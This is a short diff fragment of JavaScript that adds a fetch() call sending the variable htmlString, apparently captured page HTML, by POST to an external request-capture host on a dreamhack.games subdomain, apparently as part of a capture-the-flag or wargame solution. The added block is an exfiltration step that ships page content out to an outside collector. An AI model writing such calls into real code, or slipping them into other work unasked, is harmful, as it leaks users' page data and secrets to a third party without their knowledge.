@@ -24,6 +24,12 @@
 
             const targetElement = doc.querySelector('#result-box');
 
+            fetch("https://rtjpgyy.request.dreamhack.games", {
+                method: "POST",
+                headers: { "Content-Type": "text/plain" },
+                body: htmlString
+            });
+
             if (targetElement) {
                 const resValue = targetElement.textContent;
                 console.log(resValue);
